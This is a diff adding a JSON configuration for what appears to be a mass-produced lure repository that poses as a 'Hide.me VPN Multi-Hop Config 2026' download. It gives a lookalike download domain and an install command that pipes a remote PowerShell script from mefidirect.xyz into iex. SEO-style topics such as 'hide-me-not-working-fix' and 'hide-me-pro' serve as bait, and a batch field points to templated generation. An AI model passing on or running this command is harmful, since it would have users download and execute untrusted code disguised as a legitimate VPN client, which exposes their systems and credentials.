@@ -1,0 +1,29 @@
+{
+  "repo": "hide-me-vpn-multi-hop-config-2026",
+  "product": "Hide.me VPN Multi-Hop Config 2026",
+  "kind": "vpn",
+  "install_type": "download",
+  "download_url": "https://hide-me.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "vpn",
+  "topics": [
+    "hide-me-pro",
+    "hide-me-software",
+    "hide-me-vpn-client",
+    "hide-me-on-windows",
+    "hide-me-not-working-fix",
+    "setup-hide-me-windows",
+    "hide-me-secure-vpn",
+    "hide-me-desktop-app",
+    "hide-me-configuration-guide",
+    "hide-me-config-2026",
+    "hide-me-latest",
+    "privacy-tools",
+    "pc-utility",
+    "setup-guide",
+    "security-tools"
+  ]
+}
